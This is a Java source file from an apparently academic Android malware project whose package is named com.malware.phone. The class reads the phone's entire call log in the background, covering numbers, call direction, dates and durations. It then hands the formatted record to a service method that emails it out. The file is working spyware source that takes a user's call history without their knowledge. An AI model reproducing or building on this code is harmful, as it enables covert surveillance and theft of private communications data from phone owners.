/***********************************************************************
* This file is part of INF358-AndroidMalwareProject
* 
* Copyright (c) 2012  GPL Project Developer
* 
* INF358-AndroidMalwareProject is free software: you may copy, redistribute
* and/or modify it under the terms of the GNU General Public License as
* published by the Free Software Foundation, either version 2 of the
* License, or (at your option) any later version.
* 
* This file is distributed in the hope that it will be useful, but
* WITHOUT ANY WARRANTY; without even the implied warranty of
* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
* General Public License for more details.
* 
* You should have received a copy of the GNU General Public License
* along with this program.  If not, see <http://www.gnu.org/licenses/>.
*
* authors: Issa CAMARA, Wajih JMAIEL, Julien MEDORI, Hakim WADIL

***********************************************************************/

package com.malware.phone;

import java.util.Date;

import com.malware.service.MyService;

import android.content.ContentResolver;
import android.database.Cursor;
import android.os.AsyncTask;
import android.provider.CallLog;
import android.util.Log;

public class FetchAllCallTask extends AsyncTask {
	
	private String callList;
	private MyService service;
	
	private final boolean VERBOSE = true;
	private final String TAG = "FetchContactsTask";
	
	public FetchAllCallTask(MyService service) {
		this.service = service;
	}
	
	
	@Override
	protected Object doInBackground(Object... params) {
		
		if (VERBOSE) Log.d(TAG, "Start of FetchAllSmsTask");

		callList = fetchCall((ContentResolver) params[0]);
		
//		if (WIFI_ON)
		service.sendMail("Call logs", callList);
		
		if (VERBOSE) Log.d(TAG, "End of FetchAllSmsTask");

		return null;
	}

	private String fetchCall(ContentResolver cr) {

		if (VERBOSE) Log.d(TAG, "Fetching calls");

		String callData = "";
		Cursor callCursor = cr.query(CallLog.Calls.CONTENT_URI, null, null, null, null);
		int number = callCursor.getColumnIndex(CallLog.Calls.NUMBER);
		int type = callCursor.getColumnIndex(CallLog.Calls.TYPE);
		int date = callCursor.getColumnIndex(CallLog.Calls.DATE);
		int duration = callCursor.getColumnIndex(CallLog.Calls.DURATION);
		
		callCursor.moveToFirst();

		if (callCursor.getCount() != 0) {
			for(int i = 0 ; i < callCursor.getCount() ; i++) {
				callData += "Call #" + Integer.toString(i+1);
				String phNumber = callCursor.getString(number);
				String callType = callCursor.getString(type);
				String callDate = callCursor.getString(date);
				Date callDayTime = new Date(Long.valueOf(callDate));
				String callDuration = callCursor.getString(duration);
				
				String dir = null;
				int dircode = Integer.parseInt(callType);
				
				switch (dircode) {
				case CallLog.Calls.OUTGOING_TYPE:
					dir = "OUTGOING";
					break;

				case CallLog.Calls.INCOMING_TYPE:
					dir = "INCOMING";
					break;

				case CallLog.Calls.MISSED_TYPE:
					dir = "MISSED";
					break;
				}

				callData+="\n--- Phone Number: " + phNumber + 
						" \n--- Call Type: "+ dir + 
						" \n--- Call Date: " + callDayTime
						+ " \n--- Call duration in sec : " + callDuration;

				callData += "\n\n"; // Just for readability
				callCursor.moveToNext();
			}
		} else {
			callData = "No call in memory";
		}
		return callData;
	}

	public String getCallList() {
		return callList;
	}
}
